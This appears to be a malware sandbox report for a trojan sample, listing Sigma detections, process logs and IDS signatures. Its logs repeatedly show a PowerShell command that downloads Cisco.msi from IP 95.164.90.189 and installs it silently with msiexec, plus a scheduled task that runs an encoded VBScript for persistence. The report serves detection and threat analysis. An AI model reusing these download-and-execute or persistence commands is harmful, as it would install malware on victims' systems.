sigma_analysis_results.rule_description: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location

match_context.values: @{Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; CurrentDirectory=C:\Users\Bruno\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" Start-Process -FilePath "C:\Users\Bruno\Desktop\link.lnk"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Invoke-WebRequest "http://95.164.90.189/Cisco.msi" -OutFile "C:\Users\Bruno\AppData\Roaming\Install.msi";msiexec.exe /i 'C:\Users\Bruno\AppData\Roaming\Install.msi' /qn; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Invoke-WebRequest "http://95.164.90.189/Cisco.msi" -OutFile "C:\Users\george\AppData\Roaming\Install.msi";msiexec.exe /i 'C:\Users\george\AppData\Roaming\Install.msi' /qn; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest http://95.164.90.189/Cisco.msi -OutFile C:\Users\<USER>\AppData\Roaming\Install.msi;msiexec.exe /i C:\\Users\\<USER>\\AppData\\Roaming\\Install.msi /qn; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_description: Detects specific process parameters as used by ACTINIUM scheduled task persistence creation.

sigma_analysis_results.rule_description:
Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)

match_context.values: @{Product=Windows Installer - Unicode; CurrentDirectory=C:\Users\Bruno\; OriginalFileName=msiexec.exe; Hashes=MD5=E5DA170027542E25EDE42FC54C929077,SHA256=0A8797D088023A7F17BB00B22FF7C91036070CCA561BFF5337C472313C0CB4AD,IMPHASH=7B0965996CADE227105A63F975958C0D; Description=Windows\xae installer; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Invoke-WebRequest "http://95.164.90.189/Cisco.msi" -OutFile "C:\Users\Bruno\AppData\Roaming\Install.msi";msiexec.exe /i 'C:\Users\Bruno\AppData\Roaming\Install.msi' /qn; CommandLine="C:\Windows\system32\msiexec.exe" /i C:\Users\Bruno\AppData\Roaming\Install.msi /qn; FileVersion=5.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=0C01E942244F1ED095D5EC92DA2FA043565C5CDD,MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE; CurrentDirectory=C:\Users\george\; OriginalFileName=msiexec.exe; Product=Windows Installer - Unicode; Description=Windows\xae installer; FileVersion=5.0.17134.228 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Invoke-WebRequest "http://95.164.90.189/Cisco.msi" -OutFile "C:\Users\george\AppData\Roaming\Install.msi";msiexec.exe /i 'C:\Users\george\AppData\Roaming\Install.msi' /qn; CommandLine="C:\Windows\system32\msiexec.exe" /i C:\Users\george\AppData\Roaming\Install.msi /qn; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}
@{CommandLine=C:\Windows\system32\msiexec.exe /i C:\Users\<USER>\AppData\Roaming\Install.msi /qn; Image=C:\Windows\system32\msiexec.exe; EventID=1}

sigma_analysis_results.rule_title: Suspicious DNS Query for IP Lookup Service APIs
sigma_analysis_results.rule_description: Detects DNS queries for IP lookup services such as "api.ipify.org" originating from a non browser process.

match_context.values: @{query=api.ipify.org}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=Invoke-WebRequest http://95.164.90.189/Cisco.msi -OutFile C:\Users\Bruno\AppData\Roaming\Install.msi;msiexec.exe /i 'C:\Users\Bruno\AppData\Roaming\Install.msi' /qn; MessageTotal=1; ScriptBlockId=516a2729-1e88-497e-a630-4b10a583cb8f; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Invoke-WebRequest http://95.164.90.189/Cisco.msi -OutFile C:\Users\george\AppData\Roaming\Install.msi;msiexec.exe /i 'C:\Users\george\AppData\Roaming\Install.msi' /qn; Path=; ScriptBlockId=f823581d-d281-453a-8646-f2a7276bb19f; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Invoke-WebRequest http://95.164.90.189/Cisco.msi -OutFile C:\Users\KMkDqfyqltaT\AppData\Roaming\Install.msi;msiexec.exe /i 'C:\Users\KMkDqfyqltaT\AppData\Roaming\Install.msi' /qn; Path=; ScriptBlockId=9d98796e-ee3b-48be-bc0f-9817646c9e46; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Suspicious Network Connection to IP Lookup Service APIs
sigma_analysis_results.rule_description: Detects external IP address lookups by non-browser processes via services such as "api.ipify.org". This could be indicative of potential post compromise internet test activity.

match_context.values: @{DestinationHostname=api.ipify.org; DestinationPort=443; Initiated=true; DestinationIp=172.67.74.152}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_description: Detects the creation of scheduled tasks by user accounts via the "schtasks" utility.

match_context.values: @{Hashes=MD5=796B784E98008854C27F4B18D287BA30,SHA256=356280CCA63CA5E887FDBE5CB4105A53341FBAC9219EFC51621DF9BA8EE9838B,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05; CurrentDirectory=C:\Windows\system32\; OriginalFileName=schtasks.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Task Scheduler Configuration Tool; FileVersion=10.0.19041.906 (WinBuild.160101.0800); EventID=1; CommandLine=schtasks.exe /F /create /sc minute /mo 4 /TN "CoNlNoo" /ST 04:00 /TR "wscript /nologo /E:vbscript C:\ProgramData\1caec55e97a158ad\9cd3aaea3bf6a82a.dat"; IntegrityLevel=High; Image=C:\Windows\System32\schtasks.exe; Company=Microsoft Corporation}

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )

crowdsourced_ids_results.rule_msg: SERVER-OTHER Squid HTTP Vary response header denial of service attempt
crowdsourced_ids_results.rule_raw: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any ( msg:"SERVER-OTHER Squid HTTP Vary response header denial of service attempt"; flow:to_client,established; http_header; content:"Vary|3A|"; content:!"|0D 0A|",within 250; metadata:policy max-detect-ips drop; service:http; reference:cve,2016-2569; reference:url,www.squid-cache.org/Advisories/SQUID-2016_2.txt; classtype:denial-of-service; sid:41379; rev:1; )
alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2021_07_16;)

crowdsourced_ids_results.rule_msg: ET INFO External IP Lookup Domain (ipify .org) in DNS Lookup
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO External IP Lookup Domain (ipify .org) in DNS Lookup"; dns.query; dotprefix; content:".ipify.org"; nocase; endswith; classtype:misc-activity; sid:2047702; rev:1; metadata:affected_product Any, attack_target Client_Endpoint, created_at 2023_08_22, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, tag External_IP_Lookup, updated_at 2023_08_22, reviewed_at 2023_10_06, mitre_tactic_id TA0043, mitre_tactic_name Reconnaissance, mitre_technique_id T1590, mitre_technique_name Gather_Victim_Network_Information;)
